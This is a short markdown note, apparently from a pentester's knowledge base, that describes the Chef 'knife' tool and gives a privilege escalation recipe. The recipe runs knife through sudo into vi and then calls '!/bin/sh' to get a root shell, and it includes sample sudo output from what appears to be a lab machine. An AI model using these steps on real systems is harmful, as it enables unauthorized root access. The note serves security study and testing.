---
id: Knife
aliases: []
tags:
  - Software/Knife
---

# Knife

[Knife](https://docs.chef.io/workstation/knife/)
is a command-line tool that provides an interface
between a local chef-repo and the
[Chef Infra Server](https://docs.chef.io/server/)

`knife` helps users to manage:

- Nodes
- Cookbooks and recipes
- Roles, Environments, and Data Bags
- Resources within various cloud environments
- The installation of Chef Infra Client onto nodes
- Searching of indexed data on the Chef Infra Server

___

<!-- Privilege Escalation {{{-->
## Privilege Escalation

[GTFOBins - knife](https://gtfobins.github.io/gtfobins/knife/)

1. Enumerate if `knife` can be launched as `root`

```sh
sudo -l
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> sudo -l
> ```
>
> ```sh
> Matching Defaults entries for james on knife:
>     env_reset, mail_badpass,
>     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
>
> User james may run the following commands on knife:
>     (root) NOPASSWD: /usr/bin/knife
> ```
<!-- }}} -->


1. Run `knife` as `root` and land in [[vi]]

```sh
sudo knife data bag create 1 2 -e vi
```

2. [[vi]] - Execute system command to get a `root` shell

```sh
!/bin/sh
```

___
<!-- }}} -->
